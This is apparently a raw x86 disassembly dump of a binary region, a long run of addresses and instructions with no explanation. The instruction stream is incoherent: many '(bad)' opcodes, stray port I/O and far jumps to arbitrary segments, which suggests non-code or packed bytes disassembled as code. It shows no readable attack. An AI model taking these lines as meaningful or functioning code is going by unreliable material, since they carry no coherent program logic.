  4205fb:	mov    edi,0x4dce4c9b
  420600:	ja     0x420656
  420602:	push   esi
  420603:	and    ch,BYTE PTR [eax-0x4]
  420606:	gs (bad) 
  420608:	aaa    
  420609:	sahf   
  42060a:	adc    esp,ebx
  42060c:	sbb    DWORD PTR [esi*2-0x30166174],esi
  420613:	mov    edx,0x21bffe9d
  420618:	push   cs
  420619:	mov    ebx,0xe31f4a05
  42061e:	pop    ds
  42061f:	fsubr  DWORD PTR [edi-0x14]
  420622:	mov    BYTE PTR [ebp-0x1d789f65],ch
  420628:	fmul   QWORD PTR [edx]
  42062a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42062b:	pop    ebx
  42062c:	adc    eax,0x71c517de
  420631:	das    
  420632:	lds    edx,FWORD PTR [edi]
  420634:	dec    edi
  420635:	inc    eax
  420636:	xchg   ecx,eax
  420637:	mov    eax,0x1bfbc7f1
  42063c:	test   eax,0x977701d9
  420641:	xchg   DWORD PTR [eax],eax
  420643:	dec    esi
  420644:	xchg   esi,eax
  420645:	(bad)  
  420646:	xchg   esp,eax
  420647:	fwait
  420648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420649:	popf   
  42064a:	inc    edi
  42064b:	push   0xe0909926
  420650:	data16 rcr BYTE PTR [ebp-0x72],0xf2
  420655:	fdiv   QWORD PTR [esi+0x68]
  420658:	stos   BYTE PTR es:[edi],al
  420659:	imul   ebp,DWORD PTR [edx+0xb],0xffffff9e
  42065d:	out    dx,al
  42065e:	jl     0x420678
  420660:	(bad)  
  420662:	push   edi
  420663:	mov    esp,0x65a8bbcb
  420668:	add    eax,0x184a74dd
  42066d:	or     DWORD PTR [ecx],ebp
  42066f:	nop
  420670:	in     al,0x22
  420672:	mov    edx,0x90ae890c
  420677:	sub    BYTE PTR [ebx+edx*1-0x6ea37c4c],bl
  42067e:	and    cl,BYTE PTR [edx-0x5]
  420681:	xor    ch,ch
  420683:	shl    DWORD PTR [ebp+0xbbe0253],0xa2
  42068a:	xchg   edi,eax
  42068b:	int3   
  42068c:	jmp    0x5582:0xeb359c58
  420693:	sbb    eax,0xd4f9dde0
  420698:	adc    eax,0xb95572b7
  42069d:	push   cs
  42069e:	nop
  42069f:	sbb    eax,0xc0fd21bd
  4206a4:	sub    BYTE PTR [eax],cl
  4206a6:	scas   eax,DWORD PTR es:[edi]
  4206a7:	dec    ecx
  4206a8:	push   ss
  4206a9:	enter  0x3f20,0x2c
  4206ad:	icebp  
  4206ae:	fist   DWORD PTR [ebx]
  4206b0:	lahf   
  4206b1:	push   ss
  4206b2:	clc    
  4206b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206b4:	inc    esi
  4206b5:	adc    BYTE PTR gs:[edi+0x5b],al
  4206b9:	inc    edx
  4206ba:	(bad)  
  4206bb:	dec    ecx
  4206bc:	es pop edx
  4206be:	int3   
  4206bf:	or     ch,ah
  4206c1:	lock mov DWORD PTR [edi-0x13c2ee65],edx
  4206c8:	stc    
  4206c9:	or     al,0x2e
  4206cb:	ja     0x420728
  4206cd:	in     eax,0x82
  4206cf:	mov    DWORD PTR [edx],edx
  4206d1:	cwde   
  4206d2:	mov    edx,0x2135a0d9
  4206d7:	lods   al,BYTE PTR ds:[esi]
  4206d8:	fwait
  4206d9:	ins    BYTE PTR es:[edi],dx
  4206da:	jmp    0x534db23b
  4206df:	gs mov ah,0xdd
  4206e2:	cs addr16 push ebx
  4206e5:	pop    ds
  4206e6:	cdq    
  4206e7:	aaa    
  4206e8:	sub    eax,0x3f8fce78
  4206ed:	sbb    al,0x71
  4206ef:	add    dl,BYTE PTR [edi+0x5e]
  4206f2:	ss inc esp
  4206f4:	cmp    eax,ecx
  4206f6:	cmp    BYTE PTR [eax-0x18],cl
  4206f9:	ffree  st(6)
  4206fb:	retf   0xae4a
  4206fe:	arpl   WORD PTR [edx+0x28904706],dx
  420704:	xchg   ecx,eax
  420705:	add    eax,0x9540d99a
  42070a:	jae    0x420756
  42070c:	mov    ds:0x2de5123e,eax
  420711:	or     ebp,DWORD PTR [eax+0x7c]
  420714:	fwait
  420715:	xchg   ecx,eax
  420716:	cmp    al,0xc
  420718:	cmp    dh,bl
  42071a:	jge    0x4206d6
  42071c:	jg     0x42070a
  42071e:	(bad)  
  42071f:	test   ecx,0xde365055
  420725:	mov    ss,eax
  420727:	fs jnp 0x4206cc
  42072a:	cmp    BYTE PTR [eax-0x5e],0x41
  42072e:	mov    eax,0x53147abe
  420733:	les    edi,FWORD PTR [eax-0x2a]
  420736:	fucomi st,st(2)
  420738:	mov    ah,0xdd
  42073a:	lock mov ch,0xab
  42073d:	mov    dh,0x3e
  42073f:	push   cs
  420740:	push   ds
  420741:	loop   0x4206de
  420743:	jecxz  0x420714
  420745:	xor    edi,DWORD PTR [ecx+0xc]
  420748:	aas    
  420749:	fsubrp st(1),st
  42074b:	xor    al,0xd4
  42074d:	or     DWORD PTR [ebp+0x50],0x75
  420751:	jecxz  0x4206e2
  420753:	mov    dl,0x6f
  420755:	sbb    BYTE PTR [eax-0x7a],cl
  420758:	aaa    
  420759:	loope  0x42075e
  42075b:	lods   eax,DWORD PTR ds:[si]
  42075d:	or     bl,BYTE PTR [edx+ecx*1]
  420760:	jp     0x420731
  420762:	stos   DWORD PTR es:[edi],eax
  420763:	push   ebx
  420764:	adc    eax,0xbc579027
  420769:	xor    esp,DWORD PTR ds:0x8b6f6faf
  42076f:	pop    ecx
  420770:	loope  0x4207d4
  420772:	xchg   DWORD PTR ds:0xbcb677bb,esi
  420778:	les    esp,FWORD PTR [esi-0x7064a2ff]
  42077e:	rcr    ecx,0x94
  420781:	test   eax,0xde0f7494
  420786:	aam    0x6b
  420788:	cmc    
  420789:	sub    DWORD PTR [ebp-0x6fe7f8e6],esi
  42078f:	and    bh,BYTE PTR [ecx+0x3f53934c]
  420795:	(bad)  
  420796:	fstp   DWORD PTR [ecx+0x4a315f71]
  42079c:	jae    0x4207f5
  42079e:	or     dh,BYTE PTR [edx]
  4207a0:	(bad)  
  4207a1:	mov    bh,0xc8
  4207a3:	push   0x3a90ad18
  4207a8:	cmp    eax,0x2950f5f5
  4207ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207ae:	aam    0x85
  4207b0:	xor    eax,0x47cf9013
  4207b5:	jge    0x4207ed
  4207b7:	push   es
  4207b8:	mov    bh,0xe8
  4207ba:	(bad)
  4207be:	into   
  4207bf:	or     BYTE PTR [ebp+0x47],dh
  4207c2:	or     eax,0x26ea1b4b
  4207c7:	inc    esi
  4207c8:	and    DWORD PTR [edi],0xffffff98
  4207cb:	inc    ebp
  4207cc:	add    edi,DWORD PTR [ecx-0x53]
  4207cf:	or     edx,DWORD PTR [esi]
  4207d1:	mov    esp,0xadaeb590
  4207d6:	adc    al,dh
  4207d8:	sub    eax,0x74067bec
  4207dd:	std    
  4207de:	out    dx,eax
  4207df:	jnp    0x420763
  4207e1:	inc    ebx
  4207e2:	pop    ss
  4207e3:	mov    bl,0x9c
  4207e5:	out    dx,eax
  4207e6:	xor    DWORD PTR [edi],esp
  4207e8:	ss cmc 
  4207ea:	mov    dl,0x55
  4207ec:	retf   
  4207ed:	jne    0x42077b
  4207ef:	pop    ecx
  4207f0:	sub    DWORD PTR [edi-0x18],edx
  4207f3:	and    eax,0x74c19e57
  4207f8:	mov    ebp,0xaa65deec
  4207fd:	cmp    edx,DWORD PTR [eax]
  4207ff:	cli    
  420800:	inc    eax
  420801:	in     eax,dx
  420802:	dec    ecx
  420804:	test   al,0x5f
  420806:	pushf  
  420807:	in     eax,0x18
  420809:	loope  0x420840
  42080b:	pop    eax
  42080c:	xlat   BYTE PTR ds:[ebx]
  42080d:	popf   
  42080e:	push   cs
  42080f:	xchg   edx,eax
  420810:	mov    ecx,DWORD PTR [edx-0x4d]
  420813:	inc    edi
  420814:	cdq    
  420815:	inc    ecx
  420816:	xchg   ebx,eax
  420817:	push   cs
  420818:	xchg   ebp,eax
  420819:	mov    al,0xbb
  42081b:	(bad)  
  42081c:	mov    edi,0xc9454cc5
  420821:	fnstsw WORD PTR [eax]
  420823:	cmp    BYTE PTR [ebp-0x3d],bh
  420826:	jge    0x4207c8
  420828:	cdq    
  420829:	jb     0x4207c2
  42082b:	jno    0x42086b
  42082d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42082e:	dec    esi
  42082f:	push   ebp
  420830:	cmp    ebp,DWORD PTR [ebx+0x7a]
  420833:	jne    0x420814
  420835:	sbb    dl,cl
  420837:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420838:	sbb    esp,DWORD PTR [esp+eax*4-0x5cf3af71]
  42083f:	sub    al,0x9b
  420841:	push   ebx
  420842:	mov    dl,0x48
  420844:	in     eax,dx
  420845:	in     al,0x67
  420847:	sbb    BYTE PTR [eax],bh
  420849:	add    al,0x52
  42084b:	in     eax,dx
  42084c:	(bad)  
  42084e:	ficom  WORD PTR [ecx+0x6afc514c]
  420854:	xchg   esp,eax
  420855:	mov    dh,0x94
  420857:	push   edx
  420858:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420859:	sbb    eax,0x5e22ee38
  42085e:	inc    eax
  42085f:	cmp    eax,DWORD PTR [edx+0xa57da3f]
  420865:	pop    eax
  420866:	ss cmp dl,0x5d
  42086a:	retf   0x5628
  42086d:	js     0x420818
  42086f:	push   eax
  420870:	fwait
  420871:	sbb    eax,0x57995a9f
  420876:	outs   dx,BYTE PTR ds:[esi]
  420877:	pop    eax
  420878:	xor    bl,dh
  42087a:	and    ecx,DWORD PTR [esi]
  42087c:	push   edi
  42087d:	cld    
  42087e:	sbb    BYTE PTR [edi+0x4],bl
  420881:	(bad)  
  420882:	lahf   
  420883:	popf   
  420884:	jp     0x42088d
  420886:	fld    TBYTE PTR [ecx+0x1e6dcf7f]
  42088c:	push   es
  42088d:	(bad)  
  42088f:	add    al,0xa9
  420891:	or     al,0x79
  420893:	test   edi,esp
  420895:	cmc    
  420896:	(bad)  
  420897:	out    0xf7,al
  420899:	stos   BYTE PTR es:[edi],al
  42089a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42089b:	fucomip st,st(0)
  42089d:	mov    eax,0x895d4a0d
  4208a2:	push   ss
  4208a3:	je     0x420849
  4208a5:	(bad)  
  4208a6:	int    0xf0
  4208a8:	popf   
  4208a9:	inc    ebp
  4208aa:	xlat   BYTE PTR ds:[ebx]
  4208ab:	sub    BYTE PTR [ebx],cl
  4208ad:	sbb    BYTE PTR [ebp+0xa],ch
  4208b0:	stos   DWORD PTR es:[edi],eax
  4208b1:	out    dx,al
  4208b2:	jne    0x4208fe
  4208b4:	repnz adc al,0x64
  4208b7:	dec    edi
  4208b8:	rol    DWORD PTR [eax-0x60],0xad
  4208bc:	adc    ebx,DWORD PTR [ebp-0x70]
  4208bf:	hlt    
  4208c0:	lds    edx,FWORD PTR [edx-0x3c]
  4208c3:	and    al,0xb0
  4208c5:	dec    esi
  4208c6:	cmp    DWORD PTR [ebp+0x37],ecx
  4208c9:	enter  0xe88f,0xa8
  4208cd:	xor    BYTE PTR [ecx+edx*8-0x78],ah
  4208d1:	cmp    DWORD PTR [eax],0x32285c0a
  4208d7:	adc    eax,DWORD PTR [ecx-0x646b43c2]
  4208dd:	bound  edx,QWORD PTR [ebp+0x29]
  4208e0:	mov    ecx,0x729f9ffc
  4208e5:	fisub  WORD PTR [eax]
  4208e7:	adc    eax,0xabaa2a28
  4208ec:	repz dec eax
  4208ee:	nop
  4208ef:	mov    edx,0xd06c8d
  4208f4:	or     eax,0xbe558808
  4208f9:	adc    bl,BYTE PTR [ebp-0x6f7ef053]
  4208ff:	mov    cl,0x19
  420901:	clc    
  420902:	hlt    
  420903:	add    dh,BYTE PTR [ecx-0x1516df22]
  420909:	mov    ch,0xe5
  42090b:	icebp  
  42090c:	rcr    cl,cl
  42090e:	push   ebx
  42090f:	inc    edx
  420910:	cmp    esp,DWORD PTR [edx+0x1ca906f1]
  420916:	jae    0x420918
  420918:	lods   al,BYTE PTR ds:[esi]
  420919:	mov    esi,0xf1dec1aa
  42091e:	ror    BYTE PTR [ebp+0x4a20eb87],0xb3
  420925:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420926:	out    dx,eax
  420927:	lock xchg edi,eax
  420929:	ror    BYTE PTR [edi],0x9d
  42092c:	fwait
  42092d:	inc    ebx
  42092e:	js     0x42094a
  420930:	dec    esp
  420931:	ja     0x420925
  420933:	push   ss
  420934:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420935:	sti    
  420936:	in     eax,dx
  420937:	fs js  0x42095f
  42093a:	jl     0x420902
  42093c:	neg    BYTE PTR [ebp+0x4c12d256]
  420942:	int    0x36
  420944:	(bad)  
  420945:	loope  0x42092b
  420947:	xor    BYTE PTR [ecx-0x1e],0x87
  42094b:	jmp    0x5092:0x49a796b6
  420952:	sbb    al,al
  420954:	dec    ebp
  420955:	lea    edx,[ebp-0x3]
  420958:	fwait
  420959:	es scas eax,DWORD PTR es:[edi]
  42095b:	jmp    0xf8791af5
  420960:	xor    bl,dh
  420962:	xor    esp,esp
  420964:	retf   
  420965:	sbb    edi,DWORD PTR [edi-0x5e]
  420968:	test   ecx,edi
  42096a:	(bad)  
  42096b:	xor    BYTE PTR [edx+0x42f4c13a],dl
  420971:	inc    ebx
  420972:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420973:	dec    ecx
  420974:	push   esi
  420975:	and    DWORD PTR [ecx+esi*2+0x61],edi
  420979:	push   esp
  42097a:	cmp    al,0xef
  42097c:	mov    ecx,0x5b035f43
  420981:	aad    0x5b
  420983:	ins    BYTE PTR es:[edi],dx
  420984:	loop   0x4209b2
  420986:	xchg   edx,eax
  420987:	mov    edi,0xac74dde9
  42098c:	push   es
  42098d:	and    ebx,DWORD PTR [eax]
  42098f:	pop    esi
  420990:	mov    bh,0x90
  420992:	nop
  420993:	xor    edi,DWORD PTR [edx+0x18]
  420996:	add    eax,eax
  420998:	(bad)  
  420999:	mov    ds:0x848e4a10,al
  42099e:	adc    eax,0xb385a6f8
  4209a3:	test   eax,0x449c0b9b
  4209a8:	cli    
  4209a9:	jg     0x420931
  4209ab:	call   0xa2c22722
  4209b0:	inc    ecx
  4209b1:	adc    edx,DWORD PTR [ebx+0xd87b049]
  4209b7:	test   BYTE PTR [ebp+0x7b],ah
  4209ba:	add    ebp,edi
  4209bc:	fwait
  4209bd:	or     eax,0xf8718a9c
  4209c2:	dec    eax
  4209c3:	mov    ebx,0xc635ec8f
  4209c8:	cmp    DWORD PTR [edi-0x590e8a30],0xffffffed
  4209cf:	xchg   ecx,eax
  4209d0:	leave  
  4209d1:	sub    eax,0xc6b831f6
  4209d6:	mov    eax,0x8ffb8dd5
  4209db:	add    edx,edx
  4209dd:	and    BYTE PTR [eax-0xf43ffe1],bh
  4209e3:	push   esp
  4209e4:	ret    0x841a
  4209e7:	fstp   DWORD PTR [ebx]
  4209e9:	or     DWORD PTR [edx],ebp
  4209eb:	and    eax,0xba90b6eb
  4209f0:	inc    eax
  4209f1:	out    dx,al
  4209f2:	xchg   ebx,eax
  4209f3:	arpl   WORD PTR [ecx],cx
  4209f5:	pushf  
  4209f6:	mov    ecx,0xe70ea457
  4209fb:	mov    esp,0xd9685a7b
  420a00:	mov    eax,ds:0xf4b9ce61
  420a05:	pop    ebp
  420a06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a07:	in     al,dx
  420a08:	jnp    0x4209ec
  420a0a:	cmp    DWORD PTR [edx+0x6d],ebp
  420a0d:	fiadd  WORD PTR [eax+eax*1]
  420a10:	sub    eax,0x308916f2
  420a15:	rcl    BYTE PTR [eax-0x1c35aa37],1
  420a1b:	xor    BYTE PTR [esi-0x4d6a041b],ch
  420a21:	pop    esp
  420a22:	xchg   ecx,eax
  420a23:	pop    ss
  420a24:	jb     0x420a64
  420a26:	or     DWORD PTR [ebp-0x70],0xffffffb2
  420a2a:	mov    al,0xc3
  420a2c:	fwait
  420a2d:	popf   
  420a2e:	pop    ds
  420a2f:	add    al,0xa7
  420a31:	or     al,0xa0
  420a33:	enter  0xfcc2,0x7a
  420a37:	daa    
  420a38:	or     bl,BYTE PTR [esi+0x4edc9089]
  420a3e:	push   edx
  420a3f:	neg    BYTE PTR [ebx-0x4d8e6e9b]
  420a45:	xchg   edi,eax
  420a46:	in     al,0x8
  420a48:	in     eax,0x18
  420a4a:	sub    dh,bl
  420a4c:	fwait
  420a4d:	addr16 out dx,al
  420a4f:	ret    
  420a50:	dec    eax
  420a51:	mov    ch,0xe5
  420a53:	test   DWORD PTR [ebx+0x47e504cd],ebx
  420a59:	add    BYTE PTR [ecx+0x76de8ad3],0xbc
  420a60:	lods   eax,DWORD PTR ds:[esi]
  420a61:	jb     0x420a43
  420a63:	jp     0x420a20
  420a65:	jge    0x4209ed
  420a67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a68:	sahf   
  420a69:	xlat   BYTE PTR ds:[ebx]
  420a6a:	(bad)  
  420a6b:	rcr    edi,cl
  420a6d:	add    eax,0x93be126f
  420a72:	ret    0x774a
  420a75:	sub    eax,0x79e4c960
  420a7a:	enter  0xdb9,0x13
  420a7e:	nop
  420a7f:	inc    ecx
  420a80:	stos   DWORD PTR es:[edi],eax
  420a81:	jnp    0x420a44
  420a83:	mov    BYTE PTR [edi-0x7a98185b],0xc9
  420a8a:	imul   ecx,DWORD PTR [edi+0x69],0x16
  420a8e:	pusha  
  420a8f:	cmc    
  420a90:	pop    ebx
  420a91:	test   BYTE PTR [ebp*2+0x68a11ae2],bl
  420a98:	pushf  
  420a99:	cwde   
  420a9a:	xor    esi,eax
  420a9c:	ret    0x5acc
  420a9f:	mov    al,BYTE PTR [ebx-0x63efa6a3]
  420aa5:	cmp    al,0x6d
  420aa7:	inc    esi
  420aa8:	pusha  
  420aa9:	xor    esi,edx
  420aab:	popa   
  420aac:	xchg   DWORD PTR [eax+0x75],esi
  420aaf:	dec    edx
  420ab0:	(bad)  
  420ab1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ab2:	add    al,0x21
  420ab4:	xchg   edx,eax
  420ab5:	mov    edx,0x8a4b35c
  420aba:	enter  0x4793,0x5e
  420abe:	jg     0x420a72
  420ac0:	mov    bh,0x12
  420ac2:	out    0x49,al
  420ac4:	(bad)  
  420ac5:	xor    BYTE PTR [edi+0x32],0x2f
  420ac9:	xchg   BYTE PTR [edi],dh
  420acb:	pop    esi
  420acc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420acd:	dec    edx
  420ace:	adc    ah,ah
  420ad0:	lods   al,BYTE PTR ds:[esi]
  420ad1:	pop    ebp
  420ad2:	mov    eax,?
  420ad4:	fistp  WORD PTR [eax]
  420ad6:	scas   eax,DWORD PTR es:[edi]
  420ad7:	cmp    DWORD PTR [edx-0x49],0xffffff90
  420adb:	nop
  420adc:	loope  0x420a99
  420ade:	mov    ds:0x90dd912b,al
  420ae3:	add    eax,0xdec81e15
  420ae8:	jbe    0x420acd
  420aea:	mov    esi,DWORD PTR [ecx-0x64]
  420aed:	ja     0x420b3f
  420aef:	fpatan 
  420af1:	das    
  420af2:	inc    eax
  420af3:	xchg   ebp,eax
  420af4:	nop
  420af5:	(bad)  
  420af6:	out    0x6d,al
  420af8:	fwait
  420af9:	xchg   DWORD PTR [edi+ecx*8-0x50],eax
  420afd:	out    0xcb,eax
  420aff:	aaa    
  420b00:	nop
  420b01:	ficomp WORD PTR [ecx+ebx*4-0x66]
  420b05:	(bad)  
  420b07:	jmp    0x276b:0xf390bd6a
  420b0e:	mov    DWORD PTR [ebp+0x49d1b5e0],edx
  420b14:	dec    ebp
  420b15:	cmc    
  420b16:	aad    0x1a
  420b18:	jecxz  0x420ae8
  420b1a:	adc    DWORD PTR [esi],edx
  420b1c:	mov    bh,0xd8
  420b1e:	std    
  420b1f:	xor    eax,0x3e4c5dd9
  420b24:	jno    0x420b9c
  420b26:	cmc    
  420b27:	mov    ds:0x4a3f4fc3,al
  420b2c:	scas   al,BYTE PTR es:[edi]
  420b2d:	(bad)  
  420b2e:	retf   0xe659
  420b31:	adc    al,0xf2
  420b33:	adc    esi,edx
  420b35:	xchg   DWORD PTR [edx+ecx*8-0x3b],ecx
  420b39:	inc    esp
  420b3a:	xchg   esp,eax
  420b3b:	mov    BYTE PTR [ecx+0x7d],dh
  420b3e:	sbb    al,0xa2
  420b40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b41:	ficom  WORD PTR [edx-0x27b962f0]
  420b47:	sub    eax,0xaa83e47b
  420b4c:	mov    eax,ds:0x9e51d589
  420b51:	sbb    eax,0x802b49ca
  420b56:	mov    ah,0x44
  420b58:	inc    esi
  420b59:	mov    ds:0x2e9baee0,eax
  420b5e:	scas   eax,DWORD PTR es:[edi]
  420b5f:	or     eax,0x6fa937b5
  420b64:	or     ebp,0xdf2110b0
  420b6a:	mov    BYTE PTR [edx],ch
  420b6c:	retf   0x6509
  420b6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b70:	scas   eax,DWORD PTR es:[edi]
  420b71:	mov    edx,0x7e4b318d
  420b76:	(bad)  
  420b77:	mov    BYTE PTR [ebx-0x3e],cl
  420b7a:	nop
  420b7b:	in     eax,dx
  420b7c:	or     al,0xc4
  420b7e:	ror    dl,cl
  420b80:	mov    bl,0xc1
  420b82:	lods   eax,DWORD PTR ds:[esi]
  420b83:	dec    ecx
  420b84:	adc    al,0xe2
  420b86:	mov    cl,0x99
  420b88:	jno    0x420b9d
  420b8a:	jnp    0x420b16
  420b8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b8d:	imul   esi,DWORD PTR [esp+ebx*2-0x776f3693],0x58b03e9c
  420b98:	in     al,0xde
  420b9a:	pop    edx
  420b9b:	fcmovnu st,st(7)
  420b9d:	xlat   BYTE PTR ds:[ebx]
  420b9e:	push   esi
  420b9f:	(bad)
  420ba3:	aad    0x9b
  420ba5:	push   ds
  420ba6:	int    0x39
  420ba8:	call   0x4a1a:0x8ee54759
  420baf:	mov    dh,0x38
  420bb1:	shr    DWORD PTR [edi-0x36],0x1e
  420bb5:	and    ah,BYTE PTR [ecx-0x6f729604]
  420bbb:	adc    esp,DWORD PTR [edx-0x3]
  420bbe:	cs xchg ecx,eax
  420bc0:	pop    ecx
  420bc1:	mov    al,ds:0x3600499b
  420bc6:	test   BYTE PTR [edi+eiz*1-0xe],0x0
  420bcb:	and    eax,0xc4f3469b
  420bd0:	int    0x30
  420bd2:	js     0x420b5c
  420bd4:	test   BYTE PTR [ebx],bl
  420bd6:	in     al,dx
  420bd7:	cmp    DWORD PTR [ebx],ebx
  420bd9:	xchg   ebx,edi
  420bdb:	mov    dh,0xa8
  420bdd:	clc    
  420bde:	pop    edi
  420bdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420be0:	lods   eax,DWORD PTR ds:[esi]
  420be1:	adc    al,0x41
  420be3:	sbb    BYTE PTR [ebx+0x4ad56adb],0x54
  420bea:	pop    edx
  420beb:	popa   
  420bec:	adc    BYTE PTR [ebx+0x65],0x4a
  420bf0:	idiv   DWORD PTR ds:0xa5e118df
  420bf6:	nop
  420bf7:	push   ecx
  420bf8:	xchg   ebx,eax
  420bf9:	mov    gs,WORD PTR [edi-0x6e]
  420bfc:	cmp    eax,0x234a337d
  420c01:	jecxz  0x420bf1
  420c03:	push   es
  420c04:	(bad)  
  420c06:	sub    ch,cl
  420c08:	fwait
  420c09:	jae    0x420ba5
  420c0b:	(bad)  [eax]
  420c0d:	sbb    BYTE PTR [esi-0x37],dl
  420c10:	push   es
  420c11:	push   esi
  420c12:	into   
  420c13:	dec    ecx
  420c14:	and    BYTE PTR [ebp+0xdbf3780],cl
  420c1a:	std    
  420c1b:	xchg   esi,eax
  420c1c:	dec    ebx
  420c1d:	sub    dl,BYTE PTR [eax-0x6724f1db]
  420c23:	popf   
  420c24:	retf   0x9e8d
  420c27:	dec    ecx
  420c28:	xchg   DWORD PTR [esi-0x3149c360],esi
  420c2e:	pop    ebp
  420c2f:	or     eax,0x36be2ba2
  420c34:	sar    edx,cl
  420c36:	fisttp WORD PTR [edx]
  420c38:	out    0x3b,al
  420c3a:	test   eax,0x350f0249
  420c3f:	add    eax,0xf2137aaf
  420c44:	fwait
  420c45:	ins    DWORD PTR es:[edi],dx
  420c46:	test   al,al
  420c48:	add    ebp,DWORD PTR [edi+0x26]
  420c4b:	fcomp  st(4)
  420c4d:	in     al,0x5c
  420c4f:	cmp    eax,0x2a372507
  420c54:	jb     0x420cbd
  420c56:	adc    BYTE PTR [eax+0x8a0da9b],ch
  420c5c:	dec    esi
  420c5d:	cmp    dh,dh
  420c5f:	add    al,0x32
  420c61:	ficomp WORD PTR [ecx-0x20]
  420c64:	cmp    BYTE PTR [ebp-0x1349c23],dl
  420c6a:	xchg   ebx,eax
  420c6b:	xchg   ebp,eax
  420c6c:	jno    0x420cb6
  420c6e:	hlt    
  420c6f:	push   ds
  420c70:	sbb    esi,DWORD PTR [ecx-0x2186986b]
  420c76:	inc    esp
  420c77:	ficom  WORD PTR [ecx-0x2f]
  420c7a:	mov    ss,WORD PTR [edx+0x52]
  420c7d:	sti    
  420c7e:	(bad)  
  420c7f:	or     eax,0xedfaaff8
  420c84:	sbb    BYTE PTR [edi],al
  420c86:	sahf   
  420c87:	dec    ecx
  420c88:	dec    esi
  420c89:	or     ch,BYTE PTR [edi-0x34]
  420c8c:	outs   dx,DWORD PTR ds:[esi]
  420c8d:	mov    edi,0x5dc71267
  420c92:	xchg   edi,eax
  420c93:	inc    ecx
  420c94:	stos   BYTE PTR es:[edi],al
  420c95:	or     ecx,DWORD PTR [edi-0x76]
  420c98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c99:	adc    esi,ebp
  420c9b:	push   0xffffffb7
  420c9d:	push   ecx
  420c9e:	mov    BYTE PTR [edx+0x13],cl
  420ca1:	dec    esp
  420ca2:	inc    eax
  420ca3:	adc    edx,DWORD PTR [ebx+eax*2-0x6d]
  420ca7:	sar    BYTE PTR [eax+0x1b07c636],cl
  420cad:	fldenv [ebx+edi*1]
  420cb0:	jo     0x420c86
  420cb2:	aad    0x49
  420cb4:	lds    ecx,FWORD PTR [edx+ecx*8+0x21929e4]
  420cbb:	cdq    
  420cbc:	fwait
  420cbd:	add    edx,DWORD PTR [esi]
  420cbf:	ret    
  420cc0:	sbb    DWORD PTR [esi-0x7f],edx
  420cc3:	xor    eax,0xc536fbe0
  420cc8:	cmp    al,0x57
  420cca:	adc    dl,bl
  420ccc:	sub    BYTE PTR [ebp-0x50],al
  420ccf:	pop    ecx
  420cd0:	jnp    0x420cfb
  420cd2:	push   cs
  420cd3:	sahf   
  420cd4:	fwait
  420cd5:	sub    al,BYTE PTR [esi]
  420cd7:	mov    edx,0x750cadec
  420cdc:	popa   
  420cdd:	fimul  WORD PTR [ebx+edx*2-0x18e53506]
  420ce4:	xor    DWORD PTR [ecx-0x1c03cc70],0xef5c1261
  420cee:	pop    ss
  420cef:	push   ebx
  420cf0:	and    BYTE PTR [ecx-0x21e42896],al
  420cf6:	xor    ebx,DWORD PTR [eax+0x2b0d1d0c]
  420cfc:	fwait
  420cfd:	retf   0x1a16
  420d00:	mov    WORD PTR [esi],ss
  420d02:	sahf   
  420d03:	mov    ch,0xb6
  420d05:	fstp   QWORD PTR [ecx-0x28]
  420d08:	popf   
  420d09:	in     al,0x62
  420d0b:	fisubr DWORD PTR [edi+0x1]
  420d0e:	nop
  420d0f:	dec    edx
  420d10:	sahf   
  420d11:	inc    edi
  420d12:	and    eax,0x38bb737b
  420d17:	dec    edx
  420d18:	lods   eax,DWORD PTR ds:[esi]
  420d19:	and    ebp,DWORD PTR [esi-0x3f964378]
  420d1f:	neg    BYTE PTR [ebx+0x241ed13]
  420d25:	pop    ss
  420d26:	sti    
  420d27:	xor    al,0xbf
  420d29:	frstor [edx+0x6d]
  420d2c:	dec    ebp
  420d2d:	adc    DWORD PTR [ecx],0x900b23b4
  420d33:	mov    ds:0x69527d42,al
  420d38:	ss push es
  420d3a:	dec    BYTE PTR [edx+0x57]
  420d3d:	add    al,0xd0
  420d3f:	je     0x420db5
  420d41:	in     al,dx
  420d42:	pop    esi
  420d43:	xor    bh,BYTE PTR [esp+ebp*2]
  420d46:	nop
  420d47:	cdq    
  420d48:	inc    esp
  420d49:	icebp  
  420d4a:	xchg   ecx,eax
  420d4b:	cmc    
  420d4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d4d:	push   edi
  420d4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d4f:	dec    ecx
  420d50:	std    
  420d51:	call   ebp
  420d53:	or     eax,0x61d092da
  420d58:	mov    eax,0x292decf9
  420d5d:	and    BYTE PTR [esi+eiz*4+0x5b],0x57
  420d62:	mov    bl,0x72
  420d64:	xchg   ebp,eax
  420d65:	loope  0x420d6c
  420d67:	dec    ebx
  420d68:	mov    ds:0x9994c802,eax
  420d6d:	scas   eax,DWORD PTR es:[edi]
  420d6e:	repz adc eax,0xd4909691
  420d74:	pop    ss
  420d75:	cli    
  420d76:	sbb    edx,ebx
  420d78:	pop    edi
  420d79:	loope  0x420ddd
  420d7b:	dec    edx
  420d7c:	push   0x39
  420d7e:	aam    0x52
  420d80:	lea    ebp,ds:0x589b72b1
  420d86:	mov    ebx,ebx
  420d88:	inc    ebx
  420d89:	mov    gs,edi
  420d8b:	mov    eax,ds:0xca9ddf87
  420d90:	pop    ss
